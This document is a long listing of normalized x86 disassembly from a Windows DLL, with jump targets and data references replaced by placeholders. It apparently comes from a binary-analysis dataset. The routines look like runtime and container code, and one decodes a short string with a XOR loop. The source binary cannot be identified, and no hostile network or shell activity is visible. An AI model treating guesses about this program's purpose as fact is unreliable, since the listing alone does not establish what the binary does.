lea eax [ ebp - 0x9c ]
push eax
call sub_1001fc54
mov edi [ eax + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x9c ]
call sub_10069470
test edi edi
jne r-xdata
mov [ ebp - 0x16d ] 0x1
jmp r-xdata
test [ ebp - 0x168 ] 0x8
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x161 ] 0x1
dec edi
je r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
cmp [ ebp - 0x178 ] ax
ja r-xdata
mov ecx esi
call sub_100255aa
test edi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_100255aa
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1002f56c
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
mov ecx esi
call sub_100255aa
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + edi ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + edi ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10042a70
inc edi
cmp [ eax + edi ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
movzx ecx [ ebp - 0x178 ]
movzx eax [ esi + 0x6 ]
add ecx 0x9
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_100255aa
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x161 ] 0x1
mov [ ebp - 0x161 ] 0x1
inc edi
jmp r-xdata
mov ecx esi
call sub_1000eff4
push [ ebp - 0x16c ]
mov ecx esi
call sub_1002839c
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ eax + edi ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
movzx eax [ esi + 0x6 ]
push eax
push 0x1
lea ecx [ ebp - 0x64 ]
call sub_1002f56c
inc [ ebp - 0x17c ]
mov ecx esi
call sub_100255aa
sub_100174a0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x14
push esi
mov esi ecx
lea ecx [ ebp - 0x10 ]
push ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10005aeb
mov edx [ eax ]
mov [ esi + 0x8 ] edx
mov ecx [ eax + 0x4 ]
mov [ esi + 0xc ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x14 ] eax
add esp 0x4
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_100174e1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x2a
call sub_1005b670
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1005b670
push 0x22
pop esi
mov [ eax ] esi
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_1007f8f0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_1007f8f0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10017636
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_10029d20
push esi
mov edi eax
call sub_1004a1df
push esi
call sub_10063a9a
push eax
call sub_1000c4b2
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_1001b2d2
and [ esi + 0x1c ] 0x0
pop ecx
sub_100176b0
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov edx [ ecx + 0x34 ]
cmp [ edx ] 0x0
jle r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10017710
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_1005b8d0
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_100651be
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x14 ]
mov cl [ eax + 0x14 ]
mov [ eax + 0x14 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x14 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x14 ] bl
jne r-xdata
cmp [ edi + 0x15 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x15 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_1000a86e
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_1006eff0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x14 ] bl
cmp [ edi + 0x14 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10053ea0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
mov [ esi + 0x14 ] 0x0
call sub_10046b80
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
jmp r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x14 ] bl
je r-xdata
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10053ea0
mov eax [ ecx + 0x8 ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10046b80
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] 0x0
mov al [ esi + 0x14 ]
mov [ ecx + 0x14 ] al
mov [ esi + 0x14 ] bl
mov ecx [ ecx + 0x8 ]
mov [ ecx + 0x14 ] bl
push edx
mov ecx esi
call sub_10046b80
jmp r-xdata
mov eax [ ecx ]
mov [ eax + 0x14 ] bl
push edx
mov [ ecx + 0x14 ] 0x0
call sub_10053ea0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
sub_10017970
push ebp
mov ebp esp
push 0xffffffff
push sub_10088789
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x20
mov esi ecx
mov [ ebp - 0x9c ] ebx
call sub_1002e3ac
mov edi eax
add esp 0x4
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
xor edi edi
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
push 0x9
push r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_10034100
mov [ edi + 0x1c ] ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x57
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x4
mov [ ebp - 0x1e ] ax
jne r-xdata
test [ ebp + 0x8 ] 0x10
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xeb
call sub_10069020
lea edx [ ebp - 0x50 ]
mov eax 0x34
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
test [ ebp + 0x8 ] 0x20
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x10e
call sub_10069020
lea edx [ ebp - 0x58 ]
mov eax 0x83
call sub_10069020
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
test [ ebp + 0x8 ] 0x8
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xbe
call sub_10069020
lea edx [ ebp - 0x5c ]
mov eax 0x6c
call sub_10069020
mov eax edx
push eax
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
test [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x98
call sub_10069020
lea edx [ ebp - 0x58 ]
mov eax 0x94
call sub_10069020
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
test [ ebp + 0x8 ] 0x2
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x117
call sub_10069020
lea edx [ ebp - 0x5c ]
mov eax 0x46
call sub_10069020
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
push edi
call sub_1000ce60
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x14f
call sub_10069020
lea edx [ ebp - 0x98 ]
mov eax 0xee
call sub_10069020
mov eax edx
push eax
lea edx [ ebp - 0x68 ]
lea ecx [ ebp - 0x2c ]
call sub_1001e140
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edi
mov [ edi ] cx
call sub_1000a86e
add esp 0x4
mov eax [ edi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10017ba0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_10055e2a
int3
sub_10017bd1
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx ecx [ edx ]
lea edi [ ecx - 0x41 ]
inc edx
cmp edi 0x19
ja r-xdata
add eax 0x20
test eax eax
je r-xdata
add ecx 0x20
pop edi
sub eax ecx
pop esi
pop ebp
retn
cmp eax ecx
je r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x41 ]
inc esi
cmp ecx 0x19
ja r-xdata
sub_10017c0a
push 0x38
mov eax sub_100852a6
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006b26d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1000c882
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10017cc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
cmp [ eax + 0x104 ] edx
jbe r-xdata
pop ebp
retn 0x8
push ebx
push esi
pop esi
pop ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp eax r--data
jne r-xdata
inc eax
cmp eax r--data
jne r-xdata
mov cl [ eax + edx ]
mov eax r--data
movsx esi cl
mov edi edi
sub eax [ ebp + 0xc ]
sub eax r--data
and eax 0x3f
mov al [ eax + r--data ]
mov al cl
jmp r-xdata
movzx ebx [ eax ]
cmp ebx esi
je r-xdata
mov al cl
jmp r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp edx [ edi + 0x10 ]
jae r-xdata
mov [ ecx + edx ] al
mov ecx [ ebp + 0x8 ]
inc edx
cmp edx [ ecx + 0x104 ]
jb r-xdata
sub_10017d40
push ebp
mov ebp esp
push 0xffffffff
push sub_10089dbd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_1006ff30
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1003e780
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_10051c40
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10015820
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_10069410
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
